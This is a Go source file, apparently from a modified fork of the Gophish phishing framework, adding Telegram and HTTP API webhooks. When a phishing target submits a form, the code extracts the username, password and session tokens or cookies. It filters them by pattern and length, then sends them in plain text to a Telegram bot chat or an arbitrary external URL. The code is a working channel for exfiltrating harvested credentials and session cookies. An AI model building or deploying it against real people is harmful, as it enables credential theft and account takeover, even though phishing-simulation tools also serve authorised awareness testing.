package models

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"

	log "github.com/gophish/gophish/logger"
	"github.com/gophish/gophish/webhook"
)

const (
	WebhookTypeStandard = "standard"
	WebhookTypeTelegram = "telegram"
	WebhookTypeHTTPAPI  = "http_api"
)

// Telegram Bot API hard limit for the sendMessage text field.
const telegramMaxMessageLen = 4096

type Webhook struct {
	Id     int64  `json:"id" gorm:"column:id; primary_key:yes"`
	Name   string `json:"name"`
	Type   string `json:"type" gorm:"column:type"`
	URL    string `json:"url"`
	Secret string `json:"secret"`

	TelegramBotToken          string `json:"telegram_bot_token" gorm:"column:telegram_bot_token"`
	TelegramChatID            string `json:"telegram_chat_id" gorm:"column:telegram_chat_id"`
	TelegramIncludeUsername   bool   `json:"telegram_include_username" gorm:"column:telegram_include_username"`
	TelegramIncludePassword   bool   `json:"telegram_include_password" gorm:"column:telegram_include_password"`
	TelegramIncludeTokens     bool   `json:"telegram_include_tokens" gorm:"column:telegram_include_tokens"`
	TelegramUsernamePattern   string `json:"telegram_username_pattern" gorm:"column:telegram_username_pattern"`
	TelegramMinPasswordLength int    `json:"telegram_min_password_length" gorm:"column:telegram_min_password_length"`
	TelegramMinTokenLength    int    `json:"telegram_min_token_length" gorm:"column:telegram_min_token_length"`

	APIMethod            string `json:"api_method" gorm:"column:api_method"`
	APIHeaders           string `json:"api_headers" gorm:"column:api_headers"`
	APIIncludeUsername   bool   `json:"api_include_username" gorm:"column:api_include_username"`
	APIIncludePassword   bool   `json:"api_include_password" gorm:"column:api_include_password"`
	APIIncludeTokens     bool   `json:"api_include_tokens" gorm:"column:api_include_tokens"`
	APIUsernamePattern   string `json:"api_username_pattern" gorm:"column:api_username_pattern"`
	APIMinPasswordLength int    `json:"api_min_password_length" gorm:"column:api_min_password_length"`
	APIMinTokenLength    int    `json:"api_min_token_length" gorm:"column:api_min_token_length"`

	// Empty means all events are sent (backwards compatible).
	Events   string `json:"events" gorm:"column:events"`
	IsActive bool   `json:"is_active"`
}

var (
	ErrURLNotSpecified                = errors.New("URL can't be empty")
	ErrNameNotSpecified               = errors.New("Name can't be empty")
	ErrTelegramBotTokenNotSpecified   = errors.New("Telegram bot token can't be empty")
	ErrTelegramChatIDNotSpecified     = errors.New("Telegram chat ID can't be empty")
	ErrAPIMethodNotSpecified          = errors.New("HTTP API method can't be empty")
)

var webhookEventKeys = map[string]string{
	EventSent:       "sent",
	EventOpened:     "opened",
	EventClicked:    "clicked",
	EventDataSubmit: "submitted",
	EventReported:   "reported",
}

func GetWebhooks() ([]Webhook, error) {
	whs := []Webhook{}
	err := db.Find(&whs).Error
	return whs, err
}

func GetActiveWebhooks() ([]Webhook, error) {
	whs := []Webhook{}
	err := db.Where("is_active=?", true).Find(&whs).Error
	return whs, err
}

func GetWebhook(id int64) (Webhook, error) {
	wh := Webhook{}
	err := db.Where("id=?", id).First(&wh).Error
	return wh, err
}

func PostWebhook(wh *Webhook) error {
	err := wh.Validate()
	if err != nil {
		log.Error(err)
		return err
	}
	err = db.Save(wh).Error
	if err != nil {
		log.Error(err)
	}
	return err
}

func PutWebhook(wh *Webhook) error {
	err := wh.Validate()
	if err != nil {
		log.Error(err)
		return err
	}
	err = db.Save(wh).Error
	return err
}

func DeleteWebhook(id int64) error {
	err := db.Where("id=?", id).Delete(&Webhook{}).Error
	return err
}

func (wh *Webhook) Validate() error {
	if wh.Name == "" {
		return ErrNameNotSpecified
	}
	if wh.Type == WebhookTypeTelegram {
		if wh.TelegramBotToken == "" {
			return ErrTelegramBotTokenNotSpecified
		}
		if wh.TelegramChatID == "" {
			return ErrTelegramChatIDNotSpecified
		}
		return nil
	}
	if wh.Type == WebhookTypeHTTPAPI {
		if wh.URL == "" {
			return ErrURLNotSpecified
		}
		if wh.APIMethod == "" {
			return ErrAPIMethodNotSpecified
		}
		if wh.APIHeaders != "" {
			var h map[string]string
			if err := json.Unmarshal([]byte(wh.APIHeaders), &h); err != nil {
				return fmt.Errorf("invalid api_headers JSON: %v", err)
			}
		}
		return nil
	}
	if wh.URL == "" {
		return ErrURLNotSpecified
	}
	return nil
}

func (wh *Webhook) apiHeadersMap() map[string]string {
	h := make(map[string]string)
	if wh.APIHeaders == "" {
		return h
	}
	if err := json.Unmarshal([]byte(wh.APIHeaders), &h); err != nil {
		log.Errorf("failed to parse api_headers for webhook %d: %v", wh.Id, err)
	}
	return h
}

func webhookTagLabel(wh Webhook) string {
	switch wh.Type {
	case WebhookTypeTelegram:
		return "Webhook / Telegram"
	case WebhookTypeHTTPAPI:
		return "Webhook / HTTP API"
	default:
		return "Webhook"
	}
}

func (wh *Webhook) HandlesEvent(message string) bool {
	if strings.TrimSpace(wh.Events) == "" {
		return true
	}
	key, ok := webhookEventKeys[message]
	if !ok {
		return false
	}
	for _, ev := range strings.Split(wh.Events, ",") {
		if strings.TrimSpace(ev) == key {
			return true
		}
	}
	return false
}

func (wh *Webhook) Notify(e *Event) {
	if wh.Type == WebhookTypeTelegram {
		msg := wh.formatTelegramMessage(e)
		if msg == "" {
			return // nothing meaningful to send (e.g. no valid credentials/tokens)
		}
		if err := webhook.SendTelegram(wh.TelegramBotToken, wh.TelegramChatID, msg); err != nil {
			log.Errorf("error sending telegram webhook: %v", err)
		}
		return
	}
	if wh.Type == WebhookTypeHTTPAPI {
		if !wh.validateHTTPAPIEvent(e) {
			return
		}
		method := wh.APIMethod
		if method == "" {
			method = "POST"
		}
		if err := webhook.SendHTTPAPI(method, wh.URL, wh.apiHeadersMap(), buildHTTPAPIPayload(e)); err != nil {
			log.Errorf("error sending http api webhook: %v", err)
		}
		return
	}
	if err := webhook.Send(webhook.EndPoint{URL: wh.URL, Secret: wh.Secret}, e); err != nil {
		log.Errorf("error sending webhook: %v", err)
	}
}

type HTTPAPIPayload struct {
	CampaignID int64           `json:"campaign_id"`
	Email      string          `json:"email"`
	Time       string          `json:"time"`
	Event      string          `json:"event"`
	Username   string          `json:"username,omitempty"`
	Password   string          `json:"password,omitempty"`
	Cookies    json.RawMessage `json:"cookies,omitempty"`
}

func buildHTTPAPIPayload(e *Event) HTTPAPIPayload {
	p := HTTPAPIPayload{
		CampaignID: e.CampaignId,
		Email:      e.Email,
		Time:       e.Time.UTC().Format("2006-01-02T15:04:05Z"),
		Event:      e.Message,
	}
	if e.Message == EventDataSubmit {
		payload := payloadFromEvent(e)
		p.Username = findPayloadValue(payload, []string{"user", "email", "login"})
		p.Password = findPayloadValue(payload, []string{"pass"})
		if cv := findPayloadValue(payload, []string{"token", "cookie", "session"}); cv != "" {
			if json.Valid([]byte(cv)) {
				p.Cookies = json.RawMessage(cv)
			} else {
				b, _ := json.Marshal(cv)
				p.Cookies = json.RawMessage(b)
			}
		}
	}
	return p
}

func (wh *Webhook) formatTelegramMessage(e *Event) string {
	emoji := "🎣"
	switch e.Message {
	case EventSent:
		emoji = "📧"
	case EventOpened:
		emoji = "📨"
	case EventClicked:
		emoji = "🖱️"
	case EventDataSubmit:
		emoji = "🔑"
	case EventReported:
		emoji = "📢"
	}
	lines := []string{fmt.Sprintf("%s Gophish: %s", emoji, e.Message)}
	if e.Email != "" {
		lines = append(lines, "Target: "+e.Email)
	}
	lines = append(lines, fmt.Sprintf("Campaign ID: %d", e.CampaignId))

	hasCredentials := false
	hasTokens := false

	if e.Message == EventDataSubmit {
		payload := payloadFromEvent(e)

		usernameValid := false
		usernameValue := ""
		if wh.TelegramIncludeUsername {
			usernameValue = findPayloadValue(payload, []string{"user", "email", "login"})
			if usernameValue != "" && wh.matchUsernamePattern(usernameValue) {
				usernameValid = true
			}
		}

		passwordValid := false
		passwordValue := ""
		if wh.TelegramIncludePassword {
			passwordValue = findPayloadValue(payload, []string{"pass"})
			if passwordValue != "" && len(passwordValue) >= wh.TelegramMinPasswordLength {
				passwordValid = true
			}
		}

		if wh.TelegramIncludeUsername && wh.TelegramIncludePassword {
			hasCredentials = usernameValid && passwordValid
		}

		tokensValue := findPayloadValue(payload, []string{"token", "cookie", "session"})
		if tokensValue != "" && len(tokensValue) >= wh.TelegramMinTokenLength {
			hasTokens = true
		}

		filtersConfigured := wh.TelegramIncludeUsername || wh.TelegramIncludePassword || wh.TelegramIncludeTokens
		if filtersConfigured && !hasCredentials && !hasTokens {
			return ""
		}

		if usernameValid {
			lines = append(lines, "Username: "+usernameValue)
		}
		if passwordValid {
			lines = append(lines, "Password: "+passwordValue)
		}
		if hasTokens {
			if wh.TelegramIncludeTokens {
				const (
					tokenPrefix = "Tokens: "
					truncSuffix = "… (truncated)"
					tsLineMax   = 40 // "\nTime: YYYY-MM-DD HH:MM:SS ZZZZ"
				)
				baseLen := len(strings.Join(lines, "\n"))
				budget := telegramMaxMessageLen - baseLen - 1 - len(tokenPrefix) - tsLineMax
				if budget <= 0 {
					lines = append(lines, fmt.Sprintf("🍪 Tokens captured (too long to display, %d chars)", len(tokensValue)))
				} else if len(tokensValue) > budget {
					cut := budget - len(truncSuffix)
					if cut < 0 {
						cut = 0
					}
					lines = append(lines, tokenPrefix+tokensValue[:cut]+truncSuffix)
				} else {
					lines = append(lines, tokenPrefix+tokensValue)
				}
			} else {
				lines = append(lines, fmt.Sprintf("🍪 Tokens captured (not shown, %d chars)", len(tokensValue)))
			}
		}
	}

	lines = append(lines, "Time: "+e.Time.Local().Format("2006-01-02 15:04:05 MST"))
	return strings.Join(lines, "\n")
}

func (wh *Webhook) matchUsernamePattern(username string) bool {
	if wh.TelegramUsernamePattern == "" {
		return true
	}
	re, err := regexp.Compile(wh.TelegramUsernamePattern)
	if err != nil {
		log.Errorf("invalid telegram username regex %q: %v", wh.TelegramUsernamePattern, err)
		return true // fail open — don't silently drop notifications
	}
	return re.MatchString(username)
}

func (wh *Webhook) validateHTTPAPIEvent(e *Event) bool {
	if e.Message != EventDataSubmit {
		return true
	}
	if !wh.APIIncludeUsername && !wh.APIIncludePassword && !wh.APIIncludeTokens {
		return true // no validation configured — always forward
	}

	payload := payloadFromEvent(e)

	hasCredentials := false
	if wh.APIIncludeUsername && wh.APIIncludePassword {
		uv := findPayloadValue(payload, []string{"user", "email", "login"})
		pv := findPayloadValue(payload, []string{"pass"})
		usernameOK := uv != "" && wh.matchAPIUsernamePattern(uv)
		passwordOK := pv != "" && len(pv) >= wh.APIMinPasswordLength
		hasCredentials = usernameOK && passwordOK
	}

	hasTokens := false
	if wh.APIIncludeTokens {
		tv := findPayloadValue(payload, []string{"token", "cookie", "session"})
		hasTokens = tv != "" && len(tv) >= wh.APIMinTokenLength
	}

	return hasCredentials || hasTokens
}

func (wh *Webhook) matchAPIUsernamePattern(username string) bool {
	if wh.APIUsernamePattern == "" {
		return true
	}
	re, err := regexp.Compile(wh.APIUsernamePattern)
	if err != nil {
		log.Errorf("invalid api username regex %q: %v", wh.APIUsernamePattern, err)
		return true // fail open — don't silently drop notifications
	}
	return re.MatchString(username)
}

func payloadFromEvent(e *Event) url.Values {
	if e.Details == "" {
		return url.Values{}
	}
	var d EventDetails
	if err := json.Unmarshal([]byte(e.Details), &d); err != nil {
		log.Errorf("error parsing event details for telegram message: %v", err)
		return url.Values{}
	}
	if d.Payload == nil {
		return url.Values{}
	}
	return d.Payload
}

func findPayloadValue(payload url.Values, needles []string) string {
	keys := make([]string, 0, len(payload))
	for k := range payload {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		if k == "rid" || k == "__original_url" {
			continue
		}
		lower := strings.ToLower(k)
		for _, n := range needles {
			if strings.Contains(lower, n) {
				return strings.Join(payload[k], ", ")
			}
		}
	}
	return ""
}
